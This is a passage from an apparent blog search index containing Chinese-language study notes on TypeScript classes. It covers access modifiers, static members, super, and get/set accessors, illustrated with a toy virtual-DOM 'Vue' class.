<p>改变URL的方式：</p>
<ol>
<li>通过浏览器前进后退改变URL</li>
<li>通过&lt;a&gt;标签改变URL</li>
<li>通过window.location改变URL</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>Class类</title>
    <url>/web/study/TypeScript/9.Class%E7%B1%BB.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="ES6-Class"><a href="#ES6-Class" class="headerlink" title="ES6 Class"></a>ES6 Class</h1><p>ES6引入了Class（类）作为对象的模板，通过class关键字，可以定义类</p>
<p>ES6的class可以基本看作只是一个语法糖，它的绝大部分功能，ES5都可以做到</p>
<p>ES6的class写法只是让对象原型的写法更加清晰、更像面向对象编程的语法而已</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span> () &#123;&#125;</span><br><span class="line">  run () &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="TS-Class"><a href="#TS-Class" class="headerlink" title="TS Class"></a>TS Class</h1><h2 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h2><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">DomCls</span> &#123;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">el</span>:<span class="built_in">string</span>):<span class="title class_">HTMLElement</span></span><br><span class="line">  <span class="title function_">setText</span>(<span class="attr">el</span>:<span class="title class_">HTMLElement</span>,<span class="attr">text</span>:<span class="built_in">string</span>|<span class="literal">null</span>):<span class="built_in">void</span></span><br><span class="line">  <span class="title function_">render</span>(<span class="attr">data</span>:<span class="title class_">Vnode</span>):<span class="title class_">HTMLElement</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Vnode</span> &#123;</span><br><span class="line">  <span class="attr">tag</span>:<span class="built_in">string</span></span><br><span class="line">  text?:<span class="built_in">string</span></span><br><span class="line">  children?:<span class="title class_">Vnode</span>[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">VueCls</span> &#123;</span><br><span class="line">  <span class="attr">options</span>:<span class="title class_">Options</span></span><br><span class="line">  <span class="title function_">init</span>(): <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Options</span> &#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="built_in">string</span>|<span class="title class_">HTMLElement</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 虚拟DOM类，实现DomCls接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dom</span> <span class="keyword">implements</span> <span class="title class_">DomCls</span> &#123;</span><br><span class="line">  <span class="comment">// 创建节点的方法</span></span><br><span class="line">  <span class="title function_">createElement</span>(<span class="params">el:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">createElement</span>(el)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 填充文本的方法</span></span><br><span class="line">  <span class="title function_">setText</span>(<span class="params">el:HTMLElement,text:<span class="built_in">string</span>|<span class="literal">null</span></span>) &#123;</span><br><span class="line">    el.<span class="property">textContent</span>=text</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 渲染节点的函数</span></span><br><span class="line">  <span class="title function_">render</span>(<span class="params">data:Vnode</span>) &#123;</span><br><span class="line">    <span class="comment">// 根节点</span></span><br><span class="line">    <span class="keyword">let</span> root = <span class="variable language_">this</span>.<span class="title function_">createElement</span>(data.<span class="property">tag</span>)</span><br><span class="line">    <span class="comment">// 如果有子节点，渲染子节点</span></span><br><span class="line">    <span class="keyword">if</span>(data.<span class="property">children</span>&amp;&amp;<span class="title class_">Array</span>.<span class="title function_">isArray</span>(data.<span class="property">children</span>)) &#123;</span><br><span class="line">      data.<span class="property">children</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 处理下一层</span></span><br><span class="line">        <span class="keyword">let</span> child = <span class="variable language_">this</span>.<span class="title function_">render</span>(item)</span><br><span class="line">        <span class="comment">// 给本层的父节点添加下一层（子节点）</span></span><br><span class="line">        root.<span class="title function_">appendChild</span>(child)</span><br><span class="line">      &#125;)</span><br><span class="line">    <span class="comment">// 如果没有子节点，填充文字</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setText</span>(root,data.<span class="property">text</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回本层的根节点</span></span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue类，继承Dom类，实现VueCls接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vue</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Dom</span> <span class="keyword">implements</span> <span class="title class_">VueCls</span> &#123;</span><br><span class="line">  <span class="comment">// 属性，可以有默认值</span></span><br><span class="line">  <span class="attr">options</span>: <span class="title class_">Options</span> = &#123;<span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构造函数</span></span><br><span class="line">  <span class="title function_">constructor</span> (options?: <span class="title class_">Options</span>) &#123;</span><br><span class="line">    <span class="comment">// super()是父类的构造函数</span></span><br><span class="line">    <span class="variable language_">super</span>()</span><br><span class="line">    options? <span class="variable language_">this</span>.<span class="property">options</span>=<span class="attr">options</span>: <span class="literal">null</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">init</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 方法</span></span><br><span class="line">  <span class="title function_">init</span>(): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="comment">// 虚拟DOM就是通过JS去描述并渲染真实DOM</span></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">data</span>:<span class="title class_">Vnode</span> = &#123;</span><br><span class="line">      <span class="attr">tag</span>:<span class="string">&quot;div&quot;</span>,</span><br><span class="line">      <span class="attr">children</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">tag</span>:<span class="string">&quot;section&quot;</span>,</span><br><span class="line">          <span class="attr">text</span>:<span class="string">&quot;子节点1&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">tag</span>:<span class="string">&quot;p&quot;</span>,</span><br><span class="line">          <span class="attr">text</span>:<span class="string">&quot;子节点2&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取应用根节点</span></span><br><span class="line">    <span class="keyword">let</span> app = </span><br><span class="line">      <span class="title function_">typeof</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>) === <span class="string">&quot;string&quot;</span></span><br><span class="line">      ? <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>)</span><br><span class="line">      : <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span></span><br><span class="line">    <span class="comment">// 把内容都挂载到应用根节点上</span></span><br><span class="line">    app.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>.<span class="title function_">render</span>(data)) </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><h3 id="readonly"><a href="#readonly" class="headerlink" title="readonly"></a>readonly</h3><p>表示只读，只能应用在索引签名或属性上</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Vue</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Dom</span> <span class="keyword">implements</span> <span class="title class_">VueCls</span> &#123;</span><br><span class="line">  <span class="keyword">readonly</span> <span class="attr">options</span>: <span class="title class_">Options</span> = &#123;<span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span> (options?: <span class="title class_">Options</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>()</span><br><span class="line">    options? <span class="variable language_">this</span>.<span class="property">options</span>=<span class="attr">options</span>: <span class="literal">null</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">init</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">init</span>(): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 不能为options赋值，因为它是只读的</span></span><br><span class="line"><span class="comment">// v.options = &#123;&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><p>表示私有，只能在这个类的内部使用，外部甚至子类都不能调用</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dom</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">createElement</span>(<span class="params">el:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">createElement</span>(el)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">setText</span>(<span class="params">el:HTMLElement,text:<span class="built_in">string</span>|<span class="literal">null</span></span>) &#123;</span><br><span class="line">    el.<span class="property">textContent</span>=text</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">render</span>(<span class="params">data:Vnode</span>) &#123;</span><br><span class="line">    <span class="comment">// 可以调用createElement方法，因为现在位于Dom类内部，而且这是Dom类自己的方法</span></span><br><span class="line">    <span class="keyword">let</span> root = <span class="variable language_">this</span>.<span class="title function_">createElement</span>(data.<span class="property">tag</span>)</span><br><span class="line">    <span class="keyword">if</span>(data.<span class="property">children</span>&amp;&amp;<span class="title class_">Array</span>.<span class="title function_">isArray</span>(data.<span class="property">children</span>)) &#123;</span><br><span class="line">      data.<span class="property">children</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> child = <span class="variable language_">this</span>.<span class="title function_">render</span>(item)</span><br><span class="line">        root.<span class="title function_">appendChild</span>(child)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 可以调用setText方法，因为现在位于Dom类内部，而且这是Dom类自己的方法</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setText</span>(root,data.<span class="property">text</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vue</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Dom</span> <span class="keyword">implements</span> <span class="title class_">VueCls</span> &#123;</span><br><span class="line">  <span class="attr">options</span>: <span class="title class_">Options</span> = &#123;<span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span> (options?: <span class="title class_">Options</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>()</span><br><span class="line">    options? <span class="variable language_">this</span>.<span class="property">options</span>=<span class="attr">options</span>: <span class="literal">null</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">init</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">init</span>(): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">data</span>:<span class="title class_">Vnode</span> = &#123;</span><br><span class="line">      <span class="comment">// ...省略</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> app = </span><br><span class="line">      <span class="title function_">typeof</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>) === <span class="string">&quot;string&quot;</span></span><br><span class="line">      ? <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>)</span><br><span class="line">      : <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span></span><br><span class="line">    <span class="comment">// 不能调用render方法，因为它是Dom类的私有方法</span></span><br><span class="line">    app.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>.<span class="title function_">render</span>(data)) </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dom = <span class="keyword">new</span> <span class="title class_">Dom</span>()</span><br><span class="line"><span class="comment">// 不能调用createElement方法，因为这里不是Dom类内部</span></span><br><span class="line">dom.<span class="title function_">createElement</span>(<span class="string">&quot;#yajue&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="protect"><a href="#protect" class="headerlink" title="protect"></a>protect</h3><p>表示受保护，可以在这个类以及子类的内部使用，外部不能调用</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dom</span> &#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="title function_">createElement</span>(<span class="params">el:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">createElement</span>(el)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">protected</span> <span class="title function_">setText</span>(<span class="params">el:HTMLElement,text:<span class="built_in">string</span>|<span class="literal">null</span></span>) &#123;</span><br><span class="line">    el.<span class="property">textContent</span>=text</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">protected</span> <span class="title function_">render</span>(<span class="params">data:Vnode</span>) &#123;</span><br><span class="line">    <span class="comment">// 可以调用createElement方法，因为现在位于Dom类内部，而且这是Dom类自己的方法</span></span><br><span class="line">    <span class="keyword">let</span> root = <span class="variable language_">this</span>.<span class="title function_">createElement</span>(data.<span class="property">tag</span>)</span><br><span class="line">    <span class="keyword">if</span>(data.<span class="property">children</span>&amp;&amp;<span class="title class_">Array</span>.<span class="title function_">isArray</span>(data.<span class="property">children</span>)) &#123;</span><br><span class="line">      data.<span class="property">children</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> child = <span class="variable language_">this</span>.<span class="title function_">render</span>(item)</span><br><span class="line">        root.<span class="title function_">appendChild</span>(child)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 可以调用setText方法，因为现在位于Dom类内部，而且这是Dom类自己的方法</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setText</span>(root,data.<span class="property">text</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vue</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Dom</span> <span class="keyword">implements</span> <span class="title class_">VueCls</span> &#123;</span><br><span class="line">  <span class="attr">options</span>: <span class="title class_">Options</span> = &#123;<span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span> (options?: <span class="title class_">Options</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>()</span><br><span class="line">    options? <span class="variable language_">this</span>.<span class="property">options</span>=<span class="attr">options</span>: <span class="literal">null</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">init</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">init</span>(): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">data</span>:<span class="title class_">Vnode</span> = &#123;</span><br><span class="line">      <span class="comment">// ...省略</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> app = </span><br><span class="line">      <span class="title function_">typeof</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>) === <span class="string">&quot;string&quot;</span></span><br><span class="line">      ? <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>)</span><br><span class="line">      : <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span></span><br><span class="line">    <span class="comment">// 可以调用render方法，因为它是Dom类的受保护方法，且现在位于Dom类的子类Vue类内部</span></span><br><span class="line">    app.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>.<span class="title function_">render</span>(data)) </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dom = <span class="keyword">new</span> <span class="title class_">Dom</span>()</span><br><span class="line"><span class="comment">// 不能调用createElement方法，因为这里不是Dom类或Dom的子类内部</span></span><br><span class="line">dom.<span class="title function_">createElement</span>(<span class="string">&quot;#yajue&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 不能调用createElement方法，因为这里不是Dom类或Dom的子类内部</span></span><br><span class="line">v.<span class="title function_">createElement</span>(<span class="string">&quot;#yajue&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><p>表示公用，任何地方都可以调用</p>
<p>所有的属性和方法，如果不加修饰符，都默认为public</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dom</span> &#123;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="params">el:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">createElement</span>(el)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">setText</span>(<span class="params">el:HTMLElement,text:<span class="built_in">string</span>|<span class="literal">null</span></span>) &#123;</span><br><span class="line">    el.<span class="property">textContent</span>=text</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params">data:Vnode</span>) &#123;</span><br><span class="line">    <span class="comment">// 可以调用createElement方法，因为它是公用方法</span></span><br><span class="line">    <span class="keyword">let</span> root = <span class="variable language_">this</span>.<span class="title function_">createElement</span>(data.<span class="property">tag</span>)</span><br><span class="line">    <span class="keyword">if</span>(data.<span class="property">children</span>&amp;&amp;<span class="title class_">Array</span>.<span class="title function_">isArray</span>(data.<span class="property">children</span>)) &#123;</span><br><span class="line">      data.<span class="property">children</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> child = <span class="variable language_">this</span>.<span class="title function_">render</span>(item)</span><br><span class="line">        root.<span class="title function_">appendChild</span>(child)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 可以调用setText方法，因为它是公用方法</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setText</span>(root,data.<span class="property">text</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vue</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Dom</span> <span class="keyword">implements</span> <span class="title class_">VueCls</span> &#123;</span><br><span class="line">  <span class="attr">options</span>: <span class="title class_">Options</span> = &#123;<span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span> (options?: <span class="title class_">Options</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>()</span><br><span class="line">    options? <span class="variable language_">this</span>.<span class="property">options</span>=<span class="attr">options</span>: <span class="literal">null</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">init</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">init</span>(): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">data</span>:<span class="title class_">Vnode</span> = &#123;</span><br><span class="line">      <span class="comment">// ...省略</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> app = </span><br><span class="line">      <span class="title function_">typeof</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>) === <span class="string">&quot;string&quot;</span></span><br><span class="line">      ? <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>)</span><br><span class="line">      : <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span></span><br><span class="line">    <span class="comment">// 可以调用render方法，因为它是公用方法</span></span><br><span class="line">    app.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>.<span class="title function_">render</span>(data)) </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dom = <span class="keyword">new</span> <span class="title class_">Dom</span>()</span><br><span class="line"><span class="comment">// 可以调用createElement方法，因为它是公用方法</span></span><br><span class="line">dom.<span class="title function_">createElement</span>(<span class="string">&quot;#yajue&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 可以调用setText方法，因为它是公用方法</span></span><br><span class="line">v.<span class="title function_">setText</span>(<span class="string">&quot;#yajue&quot;</span>, <span class="string">&quot;114514&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><p>在子类中，super就代表父类，所以super()代表父类的构造函数（将this指向改为了子类），super.xxx可以取到父类的属性或方法</p>
<h2 id="静态属性-x2F-方法"><a href="#静态属性-x2F-方法" class="headerlink" title="静态属性&#x2F;方法"></a>静态属性&#x2F;方法</h2><p>例如<code>Promise.all</code>，静态方法直接通过类名调用</p>
<p>静态方法中只能调用静态属性和方法，普通方法只能调用普通属性和方法</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Vue</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Dom</span> <span class="keyword">implements</span> <span class="title class_">VueCls</span> &#123;</span><br><span class="line">  <span class="attr">options</span>: <span class="title class_">Options</span> = &#123;<span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>&#125;</span><br><span class="line">  <span class="comment">// 静态属性</span></span><br><span class="line">  <span class="keyword">static</span> a = <span class="string">&quot;12321&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span> (options?: <span class="title class_">Options</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>()</span><br><span class="line">    options? <span class="variable language_">this</span>.<span class="property">options</span>=<span class="attr">options</span>: <span class="literal">null</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">init</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">init</span>(): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">data</span>:<span class="title class_">Vnode</span> = &#123;</span><br><span class="line">      <span class="comment">// ...省略</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> app = </span><br><span class="line">      <span class="title function_">typeof</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>) === <span class="string">&quot;string&quot;</span></span><br><span class="line">      ? <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span>)</span><br><span class="line">      : <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">el</span></span><br><span class="line">    app.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>.<span class="title function_">render</span>(data)) </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 静态方法</span></span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">version</span>():<span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="comment">// 不能调用</span></span><br><span class="line">    <span class="comment">// console.log(this.options)</span></span><br><span class="line">    <span class="comment">// this.init()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态方法中只能调用静态属性和方法</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">a</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="title function_">abc</span>())</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;v 1.1.4&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">abc</span>():<span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;???&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Vue</span>.<span class="property">a</span>)          <span class="comment">// -&gt;&quot;12321&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Vue</span>.<span class="title function_">version</span>())  <span class="comment">// -&gt;&quot;1.1.4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 调用不了</span></span><br><span class="line">v.<span class="property">a</span></span><br><span class="line">v.<span class="title function_">version</span>()</span><br></pre></td></tr></table></figure>

<h2 id="get和set"><a href="#get和set" class="headerlink" title="get和set"></a>get和set</h2><p>读取或设置属性时会触发get或set函数，格式为<code>get/set [属性]() &#123;&#125;</code></p>
<p>可以用get和set函数做属性的拦截器</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Ref</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_value</span>:<span class="built_in">any</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// get和set帮你声明好属性了，不要重复声明</span></span><br><span class="line">  <span class="comment">// value:any</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span> (<span class="attr">value</span>:<span class="built_in">any</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_value</span> = value</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 读取value时触发get函数</span></span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">value</span>() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我被读取了&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_value</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置value时触发set函数</span></span><br><span class="line">  <span class="keyword">set</span> <span class="title function_">value</span>(<span class="params">newVal:<span class="built_in">any</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我被修改了&quot;</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_value</span> = newVal</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> r = <span class="keyword">new</span> <span class="title class_">Ref</span>(<span class="number">5</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(r.<span class="property">value</span>)</span><br><span class="line">r.<span class="property">value</span> = <span class="number">6</span></span><br></pre></td></tr></table></figure>

